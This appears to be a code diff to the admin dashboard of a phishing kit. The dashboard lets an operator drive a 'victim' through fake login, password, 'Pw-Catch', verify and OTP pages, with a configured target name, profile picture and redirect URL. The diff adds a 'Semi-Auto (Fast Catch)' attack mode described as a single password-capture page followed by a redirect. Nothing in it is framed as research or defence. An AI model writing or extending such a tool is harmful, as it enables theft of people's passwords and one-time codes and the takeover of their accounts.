@@ -33,7 +33,7 @@ type ConfigFormData = {
   targetName: string;
   targetProfilePicture: string;
   redirectUrl: string;
-  attackMode: 'auto' | 'manual';
+  attackMode: 'auto' | 'manual' | 'semi-auto';
 };
 
 const configSchema = z.object({
@@ -41,7 +41,7 @@ const configSchema = z.object({
     targetName: z.string().min(1, { message: "Name is required." }),
     targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()).or(z.literal('')),
     redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
-    attackMode: z.enum(['auto', 'manual']),
+    attackMode: z.enum(['auto', 'manual', 'semi-auto']),
 });
 
 export function AdminDashboard() {
@@ -327,7 +327,7 @@ export function AdminDashboard() {
                                 variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
                                 onClick={() => handleControlClick('login')}
                                 className={cn("h-12", state?.victim.currentPage === 'login' && "animate-shine")}
-                                disabled={state?.config.attackMode === 'auto'}
+                                disabled={state?.config.attackMode !== 'manual'}
                               >
                                 Login
                               </Button>
@@ -335,7 +335,7 @@ export function AdminDashboard() {
                                 variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
                                 onClick={() => handleControlClick('password')}
                                 className={cn("h-12", state?.victim.currentPage === 'password' && "animate-shine")}
-                                 disabled={state?.config.attackMode === 'auto'}
+                                 disabled={state?.config.attackMode !== 'manual'}
                               >
                                 Password
                               </Button>
@@ -343,7 +343,7 @@ export function AdminDashboard() {
                                 variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
                                 onClick={() => handleControlClick('pwCatch')}
                                 className={cn("h-12", state?.victim.currentPage === 'pwCatch' && "animate-shine")}
-                                 disabled={state?.config.attackMode === 'auto'}
+                                 disabled={state?.config.attackMode !== 'manual'}
                               >
                                 Pw-Catch
                               </Button>
@@ -351,7 +351,7 @@ export function AdminDashboard() {
                                 variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
                                 onClick={() => handleControlClick('verify')}
                                 className={cn("h-12", state?.victim.currentPage === 'verify' && "animate-shine")}
-                                 disabled={state?.config.attackMode === 'auto'}
+                                 disabled={state?.config.attackMode !== 'manual'}
                               >
                                 Verify
                               </Button>
@@ -359,7 +359,7 @@ export function AdminDashboard() {
                                 variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
                                 onClick={() => handleControlClick('otp')}
                                 className={cn("h-12", state?.victim.currentPage === 'otp' && "animate-shine")}
-                                 disabled={state?.config.attackMode === 'auto'}
+                                 disabled={state?.config.attackMode !== 'manual'}
                               >
                                 OTP
                               </Button>
@@ -367,7 +367,7 @@ export function AdminDashboard() {
                                 variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
                                 onClick={() => handleControlClick('redirect')}
                                 className={cn("h-12", state?.victim.currentPage === 'redirect' && "animate-shine")}
-                                 disabled={state?.config.attackMode === 'auto'}
+                                 disabled={state?.config.attackMode !== 'manual'}
                               >
                                 Redirect
                               </Button>
@@ -432,6 +432,15 @@ export function AdminDashboard() {
                                         </div>
                                         <p className="text-sm text-muted-foreground">
                                             A streamlined flow: Email &rarr; Password &rarr; Redirect. Captures initial credentials then redirects.
+                                        </p>
+                                    </Label>
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
+                                        <div className="flex items-center justify-between w-full">
+                                           <div className="font-semibold">Semi-Auto (Fast Catch)</div>
+                                           <RadioGroupItem value="semi-auto" id="semi-auto" />
+                                        </div>
+                                        <p className="text-sm text-muted-foreground">
+                                           A single password capture page that uses the Target Config and then redirects.
                                         </p>
                                     </Label>
                                     <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
